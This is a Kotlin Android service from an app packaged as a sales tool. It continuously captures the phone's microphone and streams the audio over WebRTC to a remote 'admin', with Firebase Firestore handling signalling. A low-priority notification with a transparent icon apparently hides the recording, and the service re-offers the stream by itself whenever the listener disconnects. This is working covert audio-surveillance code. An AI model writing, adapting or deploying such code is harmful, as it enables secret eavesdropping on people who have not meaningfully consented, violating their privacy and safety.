package com.techfifo.sales

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.FirebaseApp
import com.google.firebase.auth.ktx.auth
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import org.webrtc.*

class MicStreamService : Service() {

    private val TAG = "MicStreamService"
    private lateinit var peerConnectionFactory: PeerConnectionFactory
    private var peerConnection: PeerConnection? = null
    private lateinit var audioSource: AudioSource
    private lateinit var audioTrack: AudioTrack
    private var callId: String? = null
    private var remoteSet = false
    private val firestore by lazy { Firebase.firestore }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        FirebaseApp.initializeApp(this)
        startForegroundService()
        initializePeerConnectionFactory()
        startAudioStreaming()
    }

    private fun startForegroundService() {
        val channelId = "mic_stream_service"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Microphone Stream", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Mic Streaming")
            .setContentText("Sending audio to admin")
            .setSmallIcon(R.drawable.transparent_icon)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        startForeground(1, notification)
    }

    private fun initializePeerConnectionFactory() {
        val options = PeerConnectionFactory.InitializationOptions.builder(this)
            .setEnableInternalTracer(true)
            .createInitializationOptions()
        PeerConnectionFactory.initialize(options)

        val eglBase = EglBase.create()
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setVideoEncoderFactory(DefaultVideoEncoderFactory(eglBase.eglBaseContext, true, true))
            .setVideoDecoderFactory(DefaultVideoDecoderFactory(eglBase.eglBaseContext))
            .createPeerConnectionFactory()
        Log.d(TAG, "✅ PeerConnectionFactory initialized")
    }

    private fun startAudioStreaming() {
        callId = Firebase.auth.currentUser?.uid
        if (callId == null) {
            Log.e(TAG, "❌ No user logged in")
            stopSelf()
            return
        }

        val config = PeerConnection.RTCConfiguration(listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
        )).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
        }

        peerConnection = peerConnectionFactory.createPeerConnection(config, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                firestore.collection("calls").document(callId!!).collection("callerCandidates")
                    .add(candidate.toMap())
            }

            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
                Log.d(TAG, "ICE Connection changed: $state")
            }

            override fun onIceConnectionReceivingChange(receiving: Boolean) {
                Log.d(TAG, "ICE Receiving: $receiving")
            }

            override fun onAddStream(stream: MediaStream?) {}
            override fun onDataChannel(dc: DataChannel?) {}
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
            override fun onRemoveStream(stream: MediaStream?) {}
            override fun onRenegotiationNeeded() {}
            override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
            override fun onTrack(transceiver: RtpTransceiver?) {}
            override fun onConnectionChange(newState: PeerConnection.PeerConnectionState?) {}
            override fun onSelectedCandidatePairChanged(event: CandidatePairChangeEvent?) {}
        })

        val audioConstraints = MediaConstraints()
        audioSource = peerConnectionFactory.createAudioSource(audioConstraints)
        audioTrack = peerConnectionFactory.createAudioTrack("audio", audioSource)
        peerConnection?.addTrack(audioTrack, listOf("stream1"))
        Log.d(TAG, "🔗 AudioTrack added to PeerConnection with stream ID stream1")

        val mediaConstraints = MediaConstraints().apply {
            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"))
        }

        peerConnection?.createOffer(object : SdpObserver {
            override fun onCreateSuccess(desc: SessionDescription) {
                peerConnection?.setLocalDescription(object : SdpObserver {
                    override fun onSetSuccess() {
                        firestore.collection("calls").document(callId!!)
                            .set(mapOf("offer" to mapOf(
                                "type" to desc.type.canonicalForm(),
                                "sdp" to desc.description,
                            ), "status" to "waiting"))
                        Log.d(TAG, "📨 Offer posted to Firestore")
                        listenForAnswer()
                        listenForIceCandidates()
                        listenForDisconnectStatus()
                    }

                    override fun onSetFailure(msg: String?) {
                        Log.e(TAG, "❌ Set local description failed: $msg")
                    }

                    override fun onCreateSuccess(p0: SessionDescription?) {}
                    override fun onCreateFailure(p0: String?) {}
                }, desc)
            }

            override fun onCreateFailure(msg: String?) {
                Log.e(TAG, "❌ Offer creation failed: $msg")
            }

            override fun onSetSuccess() {}
            override fun onSetFailure(msg: String?) {}
        }, mediaConstraints)
    }

    private fun listenForAnswer() {
        firestore.collection("calls").document(callId!!)
            .addSnapshotListener { snapshot, _ ->
                if (remoteSet || peerConnection == null) return@addSnapshotListener

                val answer = snapshot?.get("answer") as? Map<*, *> ?: return@addSnapshotListener
                val type = answer["type"] as? String ?: return@addSnapshotListener
                val sdp = answer["sdp"] as? String ?: return@addSnapshotListener
                val desc = SessionDescription(SessionDescription.Type.fromCanonicalForm(type), sdp)

                peerConnection?.setRemoteDescription(object : SdpObserver {
                    override fun onSetSuccess() {
                        remoteSet = true
                        Log.d(TAG, "✅ Remote SDP set")
                        firestore.collection("calls").document(callId!!)
                            .update("status", "connected")
                    }

                    override fun onSetFailure(msg: String?) {
                        Log.e(TAG, "❌ Set remote SDP failed: $msg")
                    }

                    override fun onCreateSuccess(p0: SessionDescription?) {}
                    override fun onCreateFailure(p0: String?) {}
                }, desc)
            }
    }

    private fun listenForIceCandidates() {
        firestore.collection("calls").document(callId!!)
            .collection("calleeCandidates")
            .addSnapshotListener { snapshot, _ ->
                snapshot?.documentChanges?.forEach { change ->
                    val data = change.document.data
                    val sdpMid = data["sdpMid"] as? String ?: return@forEach
                    val sdpMLineIndex = (data["sdpMLineIndex"] as? Long)?.toInt() ?: return@forEach
                    val candidate = data["candidate"] as? String ?: return@forEach
                    peerConnection?.addIceCandidate(IceCandidate(sdpMid, sdpMLineIndex, candidate))
                }
            }
    }

    private fun listenForDisconnectStatus() {
        firestore.collection("calls").document(callId!!)
            .addSnapshotListener { snapshot, _ ->
                if (snapshot == null || !snapshot.exists()) return@addSnapshotListener
                val status = snapshot.getString("status")
                if (status == "disconnected") {
                    Log.w(TAG, "⚠ Receiver disconnected, resetting...")
                    resetCallAndRestart()
                }
            }
    }

    private fun resetCallAndRestart() {
        firestore.collection("calls").document(callId!!).delete()
            .addOnSuccessListener {
                Log.d(TAG, "🧹 Old call deleted. Restarting offer...")
                remoteSet = false
                peerConnection?.close()
                startAudioStreaming()
            }
            .addOnFailureListener {
                Log.e(TAG, "❌ Failed to delete call: ${it.message}")
            }
    }

    override fun onDestroy() {
        peerConnection?.close()
        audioSource.dispose()
        audioTrack.dispose()

        callId?.let { id ->
            val callRef = firestore.collection("calls").document(id)
            callRef.collection("callerCandidates").get()
                .addOnSuccessListener { snapshot ->
                    snapshot.documents.forEach { it.reference.delete() }
                    callRef.delete()
                }
        }

        super.onDestroy()
    }

    private fun IceCandidate.toMap(): Map<String, Any> = mapOf(
        "candidate" to sdp,
        "sdpMid" to sdpMid,
        "sdpMLineIndex" to sdpMLineIndex
    )
}